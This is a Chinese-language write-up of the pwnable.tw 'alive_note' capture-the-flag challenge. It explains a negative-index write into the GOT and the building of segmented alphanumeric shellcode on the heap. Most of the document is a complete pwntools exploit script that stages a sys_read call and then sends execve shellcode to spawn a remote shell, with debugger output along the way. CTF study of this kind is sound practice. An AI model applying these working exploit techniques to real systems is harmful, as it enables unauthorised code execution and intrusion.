## 检查

```
$ file alive_note 
alive_note: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=7202bc4e6b3c1df58cbac86ca55f98bbf0f99a6e, not stripped
$ checksec alive_note 
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

32位程序，未去符号表，同时只开了canary保护

## 分析

程序逻辑很简单，可以写名字，不能超过8个，用堆块存储，展示名字，删除名字，最多能有十个

## 漏洞点

程序的漏洞点在于读取序号时没有对负数进行限制，所以我们可以直接溢出到got表上

## 利用

很明显我们需要写shellcode，但是题目做了限制，输入内容只能是空格、数字、大小写字母（没搞懂__ctype_b_loc是啥check，所以是试出来的），而且shellcode是分布在堆上的，且每块只有八个字节，这就给利用带来了很大的麻烦

因为heap内存区域有执行权限，故这里我们使用的方式是先构造调用sys_read的shellcode，再借助它往堆上读执行execve("/bin/sh",NULL,NULL)来get shell

另外需要注意的是由于每块只有八个字节，故我们需要使用jne指令构造跳转来连接多个块

我们在free函数的got表处来构造，首先我们需要知道程序运行到shellcode时的寄存器值

(0x0804a014 - 0x0804a080) /4 = -27

```python
#!/usr/bin/env python3
from pwn import *
import sys, time

#context(arch='amd64',os='linux',log_level='debug')
#context.log_level = 'debug'

debug = 1
if debug:
	elf = ELF("./alive_note")
	libc = ELF("./libc_64.so.6")
	io = process(elf.path,env={"LD_PRELOAD" : libc.path})
else:
	elf = ELF("./alive_note")
	libc = ELF("./libc_64.so.6")
	io = remote("chall.pwnable.tw",10300)

################################################
s = io.send                                    #
sl = io.sendline                               #
sa = io.sendafter                              #
sla = io.sendlineafter                         #
r = io.recv                                    #
rl = io.recvline                               #
ru = io.recvuntil                              #
it = io.interactive                            #
################################################

# misc functions
uu32    = lambda data   :u32(data.ljust(4, b'\0'))
uu64    = lambda data   :u64(data.ljust(8, b'\0'))
leak    = lambda name,addr :log.success('{} : {:#x}'.format(name, addr))

# base addr
gdb_text_base = int(os.popen("pmap {}".format(io.pid)).readlines()[1][4:16], 16)
gdb_libc_base = int(os.popen("pmap {}| grep libc".format(io.pid)).readlines()[0][4:16], 16)

# debug function
def debug(addr=0,cmd='',PIE=True):
    if PIE: addr = gdb_text_base + addr
    log.warn("breakpoint_addr --> 0x%x" % addr)
    gdb.attach(io,"b *{}\nc\n".format(hex(addr))+cmd) 

add = lambda index,name : (sla("choice :","1"),sla("Index :",str(index)),sla("Name :",name))
show = lambda index : (sla("choice :","2"),sla("Index :",str(index)))
delate = lambda index : (sla("choice :","3"),sla("Index :",str(index)))

add(-27,"aaaaaaaa")
gdb.attach(io,"b*0x080488ea\nc\n")
delate(1)

io.interactive()
```

步入即可看到执行shellcode时的寄存器值

```asm
 EAX  0x0
 EBX  0x0
 ECX  0x0
 EDX  0x0
 EDI  0xf7f23000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
 ESI  0xf7f23000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x2d /* 0x1b2db0 */
 EBP  0xffd62758 —▸ 0xffd62768 ◂— 0x0
 ESP  0xffd6272c —▸ 0x80488ef (del_note+81) ◂— add    esp, 0x10
 EIP  0x9df5008 ◂— 'aaaaaaaa'
```

接下来就可以开始shellcode的构造了，需要注意的是多个块之间的跳转，使用jne指令时，我们还需要考虑好两段shellcode中间间隔堆块的数量以便操作数在合法范围内。然后通过减法+异或构造出`int 0x80`指令。

同时还需要注意的是sys_read的参数传递（参考的网上WP...），我们delete的时候需要注意利用这里的传入参数来构造sys_read的参数

成功执行出sys_read：

```asm
 ► 0x9727109    int    0x80 <SYS_read>
        fd: 0x0
        buf: 0x97270c8 ◂— 'Xj3X40u9'
        nbytes: 0x7a
   0x972710b    add    byte ptr [eax], al
```

0x10b - 0x0c8 = 0x43

故最后的payload构造为

```python
payload = "a" * 0x43
payload += asm(shellcraft.sh())
io.sendline(payload)
```

## EXP

```python
#!/usr/bin/env python3
from pwn import *
import sys, time

#context(arch='amd64',os='linux',log_level='debug')
#context.log_level = 'debug'

debug = 0
if debug:
	elf = ELF("./alive_note")
	libc = ELF("./libc_64.so.6")
	io = process(elf.path,env={"LD_PRELOAD" : libc.path})
else:
	elf = ELF("./alive_note")
	libc = ELF("./libc_64.so.6")
	io = remote("chall.pwnable.tw",10300)

################################################
s = io.send                                    #
sl = io.sendline                               #
sa = io.sendafter                              #
sla = io.sendlineafter                         #
r = io.recv                                    #
rl = io.recvline                               #
ru = io.recvuntil                              #
it = io.interactive                            #
################################################

'''
# misc functions
uu32    = lambda data   :u32(data.ljust(4, b'\0'))
uu64    = lambda data   :u64(data.ljust(8, b'\0'))
leak    = lambda name,addr :log.success('{} : {:#x}'.format(name, addr))

# base addr
gdb_text_base = int(os.popen("pmap {}".format(io.pid)).readlines()[1][4:16], 16)
gdb_libc_base = int(os.popen("pmap {}| grep libc".format(io.pid)).readlines()[0][4:16], 16)

# debug function
def debug(addr=0,cmd='',PIE=True):
    if PIE: addr = gdb_text_base + addr
    log.warn("breakpoint_addr --> 0x%x" % addr)
    gdb.attach(io,"b *{}\nc\n".format(hex(addr))+cmd) 
'''

add = lambda index,name : (sla("choice :","1"),sla("Index :",str(index)),sla("Name :",name))
show = lambda index : (sla("choice :","2"),sla("Index :",str(index)))
delete = lambda index : (sla("choice :","3"),sla("Index :",str(index)))

def chunk_pad (num):
	for i in range(num):
		add(10,"aaaaaaa")


### PYjzZu9
part1 = '''
push eax
pop ecx
push 0x7a
pop edx
'''
part1 = asm(part1) + b"\x75\x39"
add(-27, part1)
chunk_pad(3)

### SXH0AAu8
part2 = '''
push ebx
pop eax
dec eax
xor BYTE PTR [ecx+0x41], al
'''
part2 = asm(part2) + b"\x75\x38"
add(0, part2)
chunk_pad(3)

### 490ABSu8
part3 = '''
xor al, 0x39
xor BYTE PTR [ecx+0x42], al
push ebx
'''
part3 = asm(part3) + b"\x75\x38"
add(0, part3)
chunk_pad(3)

### Xj3X40u9
part4 = '''
pop eax
push 0x33
pop eax
xor al, 0x30
'''
part4 = asm(part4) + b"\x75\x39"
add(1, part4)
chunk_pad(3)

### 02F
part5 = b"\x30\x32\x46"
add(2, part5)

#gdb.attach(io,"b*0x080488ea\nc\n")
delete(1)

## write shellcode to run next
payload = "a" * 0x43
payload += asm(shellcraft.sh())
io.sendline(payload)

io.interactive()

```



参考：

- [[pwnable.tw] Alive Note – 构造分段alpha_shellcode](https://eqqie.cn/index.php/laji_note/1438/)